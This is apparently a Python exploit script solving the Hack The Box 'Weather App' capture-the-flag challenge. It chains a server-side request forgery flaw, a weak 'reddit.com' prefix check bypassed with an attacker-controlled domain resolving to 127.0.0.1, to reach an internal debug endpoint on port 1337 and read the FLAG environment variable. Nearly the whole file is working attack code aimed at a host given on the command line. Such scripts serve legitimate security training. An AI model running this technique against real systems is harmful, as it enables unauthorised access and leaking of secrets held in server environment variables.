import argparse
import socket

import requests

from sys import exit


def run_hack() -> bool:
    # If you look at application/util.py#35 you will notice that we cannot come from
    # localhost so this is why we use our custom DNS to fix the problem. You can also
    # see that is_from_localhost decorator is there to say that it has to resolve to 
    # 127.0.0.1. Lastly, you see that application/blueprints/routes.py#26 it is 
    # looking for f'http://{SITE_NAME}{url}' and SITE_NAME = 'reddit.com'. This is
    # the vulnerability. If we have a domain with the first part being 'reddit.com'
    # such as 'reddit.com.mysite.com' then we can redirect this request where ever 
    # we want such as '127.0.0.1'. We can also see in the Dockerfile#26 that we expose
    # TCP port 1337. Chaining this altogether gives us the exploit that will let
    # us see the flag.
    response = requests.get(
        f"{base_url}?url={args.domain}:1337/debug/environment",
        headers={"Accept": "*/*", "Connection": "close"},
    )

    if response.status_code != 200:
        print(f"[!] Exploit failed, recieved status_code '{response.status_code}'")
        print(response.text)
        return False

    try:
        flag = response.json().get("Environment variables").get("FLAG")
    except KeyError:
        print("[!] Exploit might have failed, you should check the code")
        print(response.text)
        return False
    except requests.exceptions.JSONDecodeError:
        print("[!] Exploit failed, we did not receive json output")
        print(response.text)
        return False
    else:
        print(f"[+] Found Flag: {flag}")
        return True


def validate_preconditions() -> bool:
    try:
        ip_address = socket.gethostbyname(args.domain)
    except socket.gaierror:
        print(f"[!] Domain '{args.domain}' does not resolve.")
        return False

    if not ip_address.startswith("127."):
        print(f"[!] Domain '{args.domain}' resolves to {ip_address} and not 127.0.0.1")
        return False
    else:
        return True


if __name__ == "__main__":
    parser = argparse.ArgumentParser("Exploit for HTB Weather App")
    parser.add_argument("-d","--domain", required=False, default="reddit.com2.golden2.store",
                        help="this is your hacked domain")
    parser.add_argument("-H", "--host", required=True, help="this is the host/ip to exploit")
    parser.add_argument("-P", "--port", required=True, help="this is the port to exploit")
    args = parser.parse_args()

    base_url = f"http://{args.host}:{args.port}"

    if not validate_preconditions():
        exit(-1) # We did not setup the DNS A record correctly
    elif not run_hack():
        exit(-2) # We were not able to craft the exploit correctly
    else:
        exit(1)  # Everything worked
